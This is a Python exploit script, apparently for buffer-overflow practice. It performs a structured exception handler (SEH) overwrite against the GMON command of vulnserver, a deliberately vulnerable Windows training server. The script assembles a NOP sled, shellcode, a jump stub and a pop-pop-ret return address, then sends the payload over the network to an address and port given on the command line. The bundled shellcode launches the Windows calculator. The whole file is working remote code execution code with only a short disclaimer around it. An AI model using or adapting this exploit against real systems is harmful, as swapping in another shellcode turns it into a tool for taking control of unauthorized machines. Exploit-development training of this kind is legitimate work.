import socket, sys, struct
from pwn import *

# SEH Overwrite Exploit (No SEHOP activated)
# - Attacker Operating System: Kali Linux
# - Victim Operating System: Windows 10
# - Exploitable file: https://github.com/cspshivam/bufferoverflow-prep/blob/main/vulnserver/vulnserver.exe
#
# Disclaimer: PLEASE! This is for research purposes only, and should only be used on authorized systems.
# Accessing a computer system or network without authorization or explicit permission is illegal.

if len(sys.argv) != 3:
   print("[-] Invalid arguments! Please use: python vulnserver_gmon_seh_overwrite.py <Address> <Port>")
   sys.exit(-1)

ip = sys.argv[1]
port = int(sys.argv[2])

class Exploit:

   def __init__(self, address, port):
      self.address = address
      self.port = port

   def run(self, shellcode):
      payload = b'GMON /.:/'
      payload += b'\x90' * (3547 - len(shellcode))
      payload += shellcode
      payload += struct.pack("<L", 0x909006eb)
      payload += struct.pack("<L", 0x6250172b)
      payload += b'\x59\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1'
      payload += b'C' * (5012 - len(payload))

      connection = remote(self.address, self.port)
      connection.send(payload)
      connection.close()

def main():
   calculator_shellcode = (b"\x31\xc9\xf7\xe1\x64\x8b\x41"
    b"\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b"
    b"\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
    b"\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01"
    b"\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78"
    b"\x0a\x72\x65\x73\x73\x75\xeb\x8b\x72\x24\x01"
    b"\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde"
    b"\x8b\x14\x8e\x01\xda\x89\xd5\x31\xc9\x68\x73"
    b"\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68"
    b"\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43"
    b"\x72\x65\x61\x54\x53\xff\xd2\x31\xc9\xb1\xff"
    b"\x31\xff\x57\xe2\xfd\x68\x63\x61\x6c\x63\x89"
    b"\xe1\x51\x51\x31\xd2\x52\x52\x52\x52\x52\x52"
    b"\x51\x52\xff\xd0\x83\xc4\x10\x68\x65\x73\x73"
    b"\x61\x66\x83\x6c\x24\x03\x61\x68\x50\x72\x6f"
    b"\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd5\x31"
    b"\xc9\x51\xff\xd0")

   exploit = Exploit(ip, port)
   exploit.run(calculator_shellcode)

if __name__ == "__main__":
   main()